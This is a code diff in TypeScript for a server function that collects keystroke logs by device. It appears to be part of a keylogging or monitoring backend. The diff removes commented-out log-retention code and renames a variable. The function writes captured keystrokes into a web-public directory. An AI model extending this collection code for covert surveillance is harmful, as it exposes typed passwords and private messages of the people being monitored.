@@ -16,32 +16,11 @@ export const addNewKeyLogs = async (data: any) => {
 			};
 		}
 
-		// Create a device-specific folder if it doesn't exist
+		// Create a username folder if it doesn't exist
 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
 		if (!fs.existsSync(logsDir)) {
 			fs.mkdirSync(logsDir, { recursive: true });
 		}
-
-		// // Check if the number of files exceeds the limit (2 files in this case)
-		// const files = fs
-		// 	.readdirSync(logsDir)
-		// 	.filter((file) => file.endsWith(".txt"));
-
-		// if (files.length >= 2) {
-		// 	// Sort the files by creation time (oldest first)
-		// 	const sortedFiles = files
-		// 		.map((file) => ({
-		// 			file,
-		// 			time: fs.statSync(path.join(logsDir, file)).ctimeMs,
-		// 		}))
-		// 		.sort((a, b) => a.time - b.time);
-
-		// 	// Remove the oldest file (only one file)
-		// 	const oldestFile = sortedFiles[0].file;
-		// 	console.log("the oldest file=>", oldestFile);
-		// 	fs.unlinkSync(path.join(logsDir, oldestFile));
-		// 	console.log(`Removed oldest file: ${oldestFile}`);
-		// }
 
 		// Get today's date in YYYY-MM-DD format for the file name
 		const today = new Date().toISOString().split("T")[0];
@@ -55,10 +34,10 @@ export const addNewKeyLogs = async (data: any) => {
 			return `${hours}:${minutes}:${seconds}`;
 		};
 
-		const formattedTime = formatTime(new Date());
+		const formattedDate = formatTime(new Date());
 
-		// Prepare the log entry with the formatted time
-		const logEntry = `${formattedTime} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
+		// Prepare the log entry with the formatted date
+		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
 
 		// Append the log entry to the file
 		fs.appendFileSync(filePath, logEntry);
